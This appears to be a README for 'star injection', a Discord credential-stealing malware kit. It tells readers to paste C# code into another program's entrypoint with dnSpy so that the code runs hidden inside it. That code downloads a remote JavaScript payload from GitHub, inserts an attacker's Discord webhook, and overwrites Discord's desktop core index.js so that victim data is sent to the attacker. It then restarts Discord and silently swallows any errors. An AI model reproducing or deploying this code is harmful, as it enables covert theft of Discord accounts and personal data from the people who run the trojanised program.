# star injection

### Usage:
- download [dnspy]()
- drag & drop ur file in dnspy
- right click ur file
- go to the entrypoint
- edit the class
- and paste the code inside

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
```

```csharp
private static string webhook = "https://discord.com/api/webhooks/xxx/xxx";

        static async Task<string> FetchInjectionScriptAsync()
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync("https://raw.githubusercontent.com/JunkieOpfer/star/main/injection/dc_inj.js");
                if (response.IsSuccessStatusCode)
                {
                    string content = await response.Content.ReadAsStringAsync();
                    return content.Replace("%WEBHOOK%", webhook);
                }
                else
                {
                    throw new Exception($"Failed to fetch injection script. Status code: {response.StatusCode}");
                }
            }
        }

        static async Task InjectAsync()
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[] discordDirs = Directory.GetDirectories(localAppData, "*discord*", SearchOption.TopDirectoryOnly);

            foreach (string discordDir in discordDirs)
            {
                string[] subDirs = Directory.GetDirectories(discordDir, "app-*", SearchOption.TopDirectoryOnly);

                foreach (string subDir in subDirs)
                {
                    if (Regex.IsMatch(subDir, @"app-\d*\.\d*"))
                    {
                        // modules/discord_desktop_core-1/discord_desktop_core/index.js
                        string abspath = Path.Combine(subDir, "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js");
                        string injectionScript = await FetchInjectionScriptAsync();
                        File.WriteAllText(abspath, injectionScript, System.Text.Encoding.UTF8);
                        System.Diagnostics.Process.Start(Path.Combine(subDir, Path.GetFileName(subDir) + ".exe"));
                    }
                }
            }
        }

        static async Task Main(string[] args)
        {
            try
            {
                // injecting
                await InjectAsync();
            }
            catch (Exception ex)
            {
                // only if you want to know what the error is
                // Console.Error.WriteLine("Error: " + ex.Message);
            }
        }
```
